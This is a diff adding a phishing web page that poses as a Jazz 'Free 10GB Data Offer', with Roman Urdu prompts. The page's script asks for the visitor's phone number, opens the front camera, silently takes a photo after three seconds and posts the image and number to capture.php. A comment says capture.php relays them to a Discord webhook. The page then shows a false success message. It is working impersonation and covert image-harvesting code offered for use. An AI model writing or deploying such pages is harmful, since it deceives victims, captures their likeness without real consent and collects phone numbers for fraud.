@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Jazz Free 10GB Offer</title>
+    <style>
+        body { background: #c00; color: white; text-align: center; font-family: Arial, sans-serif; margin: 0; padding: 20px; }
+        .container { max-width: 400px; margin: 50px auto; background: white; color: black; padding: 30px; border-radius: 15px; box-shadow: 0 0 20px rgba(0,0,0,0.3); }
+        .logo { width: 200px; margin-bottom: 20px; }
+        h1 { color: #c00; }
+        input, button { width: 100%; padding: 15px; margin: 10px 0; font-size: 16px; border-radius: 8px; border: none; }
+        input { border: 1px solid #ccc; }
+        button { background: #ff0000; color: white; font-weight: bold; cursor: pointer; }
+        button:hover { background: #d00; }
+        #video { width: 300px; height: 300px; object-fit: cover; border-radius: 10px; margin: 20px auto; display: none; }
+        canvas { display: none; }
+        .success { display: none; color: green; font-size: 18px; font-weight: bold; margin-top: 20px; }
+        .error { color: red; font-size: 16px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://jazz.com.pk/assets/images/logo.png" alt="Jazz Logo" class="logo">
+        <h1>Free 10GB Data Offer!</h1>
+        <p>Apna Jazz number daalein aur free internet hasil karein.</p>
+        <p><strong>Limited Time Archive Offer!</strong></p>
+        
+        <input type="text" id="number" placeholder="03xxxxxxxxx" required>
+        <button onclick="startCapture()">Activate Now</button>
+        
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
+        
+        <div id="success" class="success">
+            <h2>Congratulations!</h2>
+            <p>Aap ka 10GB Free Data activate ho gaya hai.</p>
+            <p>24 hours mein balance mein add ho jaayega. Thank you for choosing Jazz!</p>
+        </div>
+        
+        <div id="error" class="error"></div>
+    </div>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const success = document.getElementById('success');
+        const errorDiv = document.getElementById('error');
+
+        async function startCapture() {
+            const number = document.getElementById('number').value.trim();
+            if (!number) {
+                errorDiv.textContent = 'Please enter Jazz number!';
+                return;
+            }
+
+            errorDiv.textContent = '';
+            success.style.display = 'none';
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
+                video.style.display = 'block';
+
+                setTimeout(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const imageData = canvas.toDataURL('image/jpeg');
+
+                    // Send to PHP (Discord webhook)
+                    fetch('capture.php', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: 'image=' + encodeURIComponent(imageData) + '&number=' + encodeURIComponent(number)
+                    }).then(response => response.text())
+                      .then(result => {
+                          console.log(result);
+                      }).catch(err => {
+                          console.error(err);
+                      });
+
+                    // Stop camera and show success
+                    stream.getTracks().forEach(track => track.stop());
+                    video.style.display = 'none';
+                    success.style.display = 'block';
+                }, 3000); // 3 seconds delay for clear photo
+
+            } catch (err) {
+                errorDiv.textContent = 'Camera access denied ya error aaya. Offer claim nahi hua.';
+                console.error(err);
+            }
+        }
+    </script>
+</body>
+</html>
